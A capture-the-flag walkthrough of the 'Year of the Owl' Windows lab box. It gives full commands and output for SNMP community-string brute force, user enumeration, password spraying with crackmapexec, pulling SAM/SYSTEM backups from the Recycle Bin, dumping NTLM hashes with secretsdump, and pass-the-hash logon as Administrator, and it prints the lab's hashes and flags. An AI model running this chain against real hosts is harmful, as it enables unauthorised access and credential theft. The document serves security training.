> Year of The Owl

**export IP=10.10.82.140**

# Nmap

sudo nmap -sC -sV -T4 -Pn -p- -oN nmap/initial $IP

```
80/tcp    open  http          syn-ack ttl 127 Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.4.10)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.4.10
|_http-title: Year of the Owl
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      syn-ack ttl 127 Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.4.10)
445/tcp   open  microsoft-ds? syn-ack ttl 127
3306/tcp  open  mysql?        syn-ack ttl 127
| fingerprint-strings: 
|   NULL: 
|_    Host 'ip-10-8-107-21.eu-west-1.compute.internal' is not allowed to connect to this MariaDB server
| mysql-info: 
|_  MySQL Error: Host 'ip-10-8-107-21.eu-west-1.compute.internal' is not allowed to connect to this MariaDB server
3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
```

# Gobuster

sudo gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -x .txt,.php,.html,.sql,.bak,.zip,.cgi,.js -o gobuster/initial

```
Nil
```

We got nothing much interesting from now. Let's try UDP scan.

# UDP Scan

We can run the top 10 ports.

sudo nmap -sU --top-ports 10 10.10.39.26

```
53/udp   open|filtered domain
67/udp   open|filtered dhcps
123/udp  open|filtered ntp
135/udp  open|filtered msrpc
137/udp  open|filtered netbios-ns
138/udp  open|filtered netbios-dgm
161/udp  open|filtered snmp
445/udp  open|filtered microsoft-ds
631/udp  open|filtered ipp
1434/udp open|filtered ms-sql-m
```

There are many services. After reading writeups I moved with snmp. We can use a tool `onesixtyone` .This tool is a SNMP scanner. First we have to have a `community string`. We can also bruteforcing using this tool.

onesixtyone 10.10.39.26 -c /usr/share/wordlists/SecLists/Discovery/SNMP/snmp-onesixtyone.txt 

```
10.10.39.26 [openview] Hardware: Intel64 Family 6 Model 63 Stepping 2 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build 17763 Multiprocessor Free)
```

Ooh we got the `community string` : `openview`. Let's use snmp-check now!

# snmp-check

snmp-check -c openview 10.10.39.26

We got some usernames.

```
[*] User accounts:

  Guest               
  Jareth              
  Administrator       
  DefaultAccount      
  WDAGUtilityAccount 
```

We could also gain usernames manually using snmpwalk. SNMP usually stores data in a tree structure and read information from left to right. And the default location of the usernames is `1.3.6.1.4.1.77.1.2.25`. 

snmpwalk -c openview -v1 10.10.225.41 1.3.6.1.4.1.77.1.2.25

```
iso.3.6.1.4.1.77.1.2.25.1.1.5.71.117.101.115.116 = STRING: "Guest"
iso.3.6.1.4.1.77.1.2.25.1.1.6.74.97.114.101.116.104 = STRING: "Jareth"
iso.3.6.1.4.1.77.1.2.25.1.1.13.65.100.109.105.110.105.115.116.114.97.116.111.114 = STRING: "Administrator"
iso.3.6.1.4.1.77.1.2.25.1.1.14.68.101.102.97.117.108.116.65.99.99.111.117.110.116 = STRING: "DefaultAccount"
iso.3.6.1.4.1.77.1.2.25.1.1.18.87.68.65.71.85.116.105.108.105.116.121.65.99.99.111.117.110.116 = STRING: "WDAGUtilityAccount"
```

All we have is an username let's try and crack some services using crackmapexec.

crackmapexec smb 10.10.225.41 -u Jareth -p /usr/share/wordlists/rockyou.txt

```
SMB         10.10.225.41    445    YEAR-OF-THE-OWL  [+] year-of-the-owl\Jareth:sarah
```

We can try WinRM too.

/opt/evil-winrm/evil-winrm.rb -i 10.10.225.41 -u Jareth -p sarah

We are in as Jareth.

# user.txt

```
THM{Y2I0NDJjODY2NTc2YmI2Y2U4M2IwZTBl}
```

# Privilege Escalation

Looks like there is antivirus in place and after reading some writeups we come to know that SID's are recycled in recycle bin which are only visible to admin. (C:\$Recycle.bin\<SID>) But this is present in every user's account . That means we can only access our own account's SID.

whoami /all | Select-String -Pattern "jareth" -Context 2,0


```
  User Name              SID
  ====================== =============================================
> year-of-the-owl\jareth S-1-5-21-1987495829-1628902820-919763334-1001
```

We got our SID now let's see the files.

cd C:\$Recycle.bin\S-1-5-21-1987495829-1628902820-919763334-1001

We got 2 files

```
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        9/18/2020   7:28 PM          49152 sam.bak
-a----        9/18/2020   7:28 PM       17457152 system.bak
```

We need to move these files to a temp location and we can dowload them to our machine using evil-winrm's download.

```
copy system.bak C:\Windows\Temp\system.bak
copy sam.bak C:\Windows\Temp\sam.bak
download C:\Windows\Temp\sam.bak
download C:\Windows\Temp\system.bak
```

# Dumping Creds with secretsdump.py

sudo python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL >> hashes.txt

```
[*] Target system bootKey: 0xd676472afd9cc13ac271e26890b87a8c
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:6bc99ede9edcfecf9662fb0c0ddcfa7a:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:39a21b273f0cfd3d1541695564b4511b:::
Jareth:1001:aad3b435b51404eeaad3b435b51404ee:5a6103a83d2a94be8fd17161dfd4555a:::
[*] Cleaning up...
```

Let's use admin's hash to get priv access.

sudo /opt/evil-winrm/evil-winrm.rb -i 10.10.225.41 -u Administrator -H 6bc99ede9edcfecf9662fb0c0ddcfa7a

We are in as admin!!

# admin.txt

```
THM{YWFjZTM1MjFiZmRiODgyY2UwYzZlZWM2}
```